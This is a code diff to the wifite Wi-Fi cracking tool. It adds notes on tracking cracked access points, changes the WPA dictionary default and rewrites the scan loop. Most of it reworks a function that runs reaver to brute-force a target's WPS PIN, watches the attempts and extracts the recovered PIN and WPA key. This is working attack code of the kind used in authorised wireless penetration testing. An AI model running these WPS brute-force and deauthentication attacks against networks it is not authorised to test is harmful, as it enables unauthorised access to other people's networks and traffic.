@@ -11,10 +11,23 @@
 	 * Show Channel (CH) column when displaying targets
 	 * Show BSSId as well? (too wide? make it a switch)
 
-	 * 
+	 Remember cracked access points
+	 * Store in human-readable text file? database?
+	 * Option for "-cracked" to display list of cracked access points?
+	 * Need to be able to load cracked BSSID's into list, keep there.
+	 * "SSID has already been cracked (key=<KEY>), do you want to crack again?
+
+	 WPS
+	 * Mention reaver automatically resumes sessions
+	 * Warning about length of time required for WPS attack (*hours*)
+	 * Show time since last successful attempt
+	 * Percentage of tries/attempts ?
 	 
-	 * WEP:
-	   - ability to pause/skip/continue	 
+	 WEP:
+	 * ability to pause/skip/continue	 
+	 * Option to capture only IVS packets (uses --output-format ivs,csv)
+	   - not compatible on older aircrack-ng's.
+		 - would cut down on size of saved .caps
 	 
 	 * reaver:
 	 	 MONITOR ACTIVITY!
@@ -575,7 +588,7 @@ def help():
 	print sw+'\t-wpadt '+var+'<sec>  \t'+des+'time to wait between sending deauth packets (sec) '+de+'[10]'+W
 	print sw+'\t-strip      \t'+des+'strip handshake using tshark or pyrit             '+de+'[off]'+W
 	print sw+'\t-crack '+var+'<dic>\t'+des+'crack WPA handshakes using '+var+'<dic>'+des+' wordlist file    '+de+'[off]'+W
-	print sw+'\t-dict '+var+'<file>\t'+des+'specify dictionary to use when cracking WPA '+de+'[darkc0de.lst]'+W
+	print sw+'\t-dict '+var+'<file>\t'+des+'specify dictionary to use when cracking WPA '+de+'[phpbb.txt]'+W
 	print sw+'\t-aircrack   \t'+des+'verify handshake using aircrack '+de+'[on]'+W
 	print sw+'\t-pyrit      \t'+des+'verify handshake using pyrit    '+de+'[on]'+W
 	print sw+'\t-tshark     \t'+des+'verify handshake using tshark   '+de+'[off]'+W
@@ -745,6 +758,7 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 	try:
 		deauth_sent = 0.0
 		old_targets = []
+		stop_scanning = False
 		while True:
 			time.sleep(0.3)
 			if not os.path.exists(temp + 'wifite-01.csv'):
@@ -769,7 +783,9 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 						try: os.kill(proc.pid, SIGTERM)
 						except OSError: pass
 						except UnboundLocalError: pass
-						return ([t],clients)
+						targets = [t]
+						stop_scanning = True
+						break
 			if TARGET_BSSID != '':
 				for t in targets:
 					if t.bssid.lower() == TARGET_BSSID.lower():
@@ -777,7 +793,11 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 						try: os.kill(proc.pid, SIGTERM)
 						except OSError: pass
 						except UnboundLocalError: pass
-						return ([t],clients)
+						targets = [t]
+						stop_scanning = True
+						break
+
+			if stop_scanning: break
 			
 			# If there are unknown SSIDs, send deauths to them.
 			if channel != 0 and time.time() - deauth_sent > 5:
@@ -805,7 +825,7 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 							if ot.ssid == '' and ot.bssid == t.bssid:
 								print '\r %s successfully decloaked "%s"                     ' % \
 								        (GR+sec_to_hms(time.time() - time_started)+W, G+t.ssid+W)
-
+				
 				old_targets = targets[:]
 			
 			print ' %s %s wireless networks. %s target%s and %s client%s found   \r' % (
@@ -814,6 +834,7 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 			      G+str(len(clients))+W, '' if len(clients) == 1 else 's'),
 			stdout.flush()
 	except KeyboardInterrupt: print ''
+	else: print ''
 	
 	send_interrupt(proc)
 	try: os.kill(proc.pid, SIGTERM)
@@ -826,6 +847,7 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 	
 	remove_airodump_files(temp + 'wifite')
 	
+	if stop_scanning: return (targets, clients)
 	print ''
 	
 	if len(targets) == 0:
@@ -1047,7 +1069,7 @@ def print_and_exec(cmd):
 	print O+' [!] '+W+'executing: '+O+' '.join(cmd) + W,
 	stdout.flush()
 	call(cmd, stdout=DN, stderr=DN)
-	time.sleep(0.5)
+	time.sleep(0.1)
 
 
 
@@ -2286,20 +2308,28 @@ def wps_attack(iface, target):
 		print C+'        http://code.google.com/p/reaver-wps/'
 		return False
 	
-	print GR+' [0:00:00]'+W+' initializing %sWPS-brute force attack%s against %s' % (G, W, G+target.ssid+W)
+	print GR+' [0:00:00]'+W+' initializing %sWPS PIN attack%s on %s' % (G, W, G+target.ssid+W)
 	
 	cmd = ['reaver',
 	       '-i', iface,
 	       '-b', target.bssid,
 	       '-o', temp + 'out.out',
-	       '-a',  # auto-detect best options
-	       '--ignore-locks',
+	       '-a',  # auto-detect best options, also auto-resumes sessions
+				 '-c', target.channel,
+	       # '--ignore-locks',
 	       '-vv']  # semi-verbose output
+	print ' '.join(cmd)
 	proc = Popen(cmd, stdout=DN, stderr=DN)
 	cracked = False
-	percent = 'x.xx'
+	percent = 'x.xx%'
 	aps = 'x'
 	time_started = time.time()
+	last_pin = ''
+	last_success = 0
+	lock_wait_time = 0
+	retries  = 0
+	attempts = 0
+	tries    = 0
 	try:
 		while not cracked:
 			time.sleep(1)
@@ -2309,18 +2339,65 @@ def wps_attack(iface, target):
 				lines = inf.read().split('\n')
 				inf.close()
 				for line in lines:
+					if line.strip() == '': continue
+					# print '\n' + line
+					# Status
 					if line.find(' complete @ ') != -1 and len(line) > 8:
-						percent = line[4:8]
+						percent = line.split(' ')[1]
 						i = line.find(' (')
 						j = line.find(' seconds/attempt', i)
 						if i != -1 and j != -1: aps = line[i+2:j]
-				print ' %s brute-forcing WPS pin via %s, %s%% (%s sec/try)    \r' % \
+					# PIN attempt
+					elif line.find(' Trying pin ') != -1:
+						pin = line.split(' ')[-1]
+						if pin == last_pin: 
+							retries += 1
+						elif attempts == 0:
+							last_pin = pin
+							attempts -= 1
+						else:
+							last_success = time.time()
+							tries += 1
+							last_pin = pin
+							retries = 0
+						attempts += 1
+
+						if retries == 10:
+							# Do something?
+							pass
+
+					# Warning
+					elif line.endswith('10 failed connections in a row'):
+						pass
+					
+					# Check for PIN/PSK
+					pin = ''
+					key = ''
+					for line in lines:
+						# When it's cracked:
+						if line.find("[+] WPS PIN: '") != -1:
+							pin = line[14:-1]
+							cracked = True
+						if line.find("[+] WPA PSK: '") != -1:
+							key = line[14:-1]
+							cracked = True
+				if pin != '': print GR+'\n\n [+]'+G+' PIN found:     %s' % (C+pin+W)
+				if key != '': print GR+' [+] %sWPA key found%s: "%s"' % (G, W, C+key+W)
+				
+				print ' %s WPS attack, %s tries/att,' % \
 				            (GR+sec_to_hms(time.time()-time_started)+W, \
-				            G+'reaver'+W, G+percent+W, G+aps+W),
+				            G+str(tries)+W+'/'+O+str(attempts)+W),
+
+				if percent == 'x.xx%': print '\r',
+				else:
+					print '%s complete (%s sec/att)   \r' % (G+percent+W, G+aps+W),
+				
 				stdout.flush()
+				inf = open(temp + 'out.out', 'w')
+				inf.close()
 			
 			if proc.poll() != None:
-				# Cracked? Failed? 
+				# Process stopped: Cracked? Failed? 
 				inf = open(temp + 'out.out', 'r')
 				lines = inf.read().split('\n')
 				inf.close()
@@ -2336,6 +2413,9 @@ def wps_attack(iface, target):
 				
 				if pin != '': print GR+'\n\n [+]'+G+' PIN found:     %s' % (C+pin+W)
 				if key != '': print GR+' [+] %sWPA key found%s: "%s"' % (G, W, C+key+W)
+				if pin == '' and key == '':
+					copy(temp + 'out.out', 'out.out')
+					print 'copied out.out'
 				break
 		
 		if cracked:
@@ -2345,7 +2425,10 @@ def wps_attack(iface, target):
 	except KeyboardInterrupt:
 		print R+'\n (^C)'+O+' WPS brute-force attack interrupted'+W
 	
+	send_interrupt(proc)
+
 	return cracked
+
 
 
 #c = CapFile('hs/KillfuckSoulshitter_C0-C1-C0-07-54-DC_2.cap', 'Killfuck Soulshitter', 'c0:c1:c0:07:54:dc')
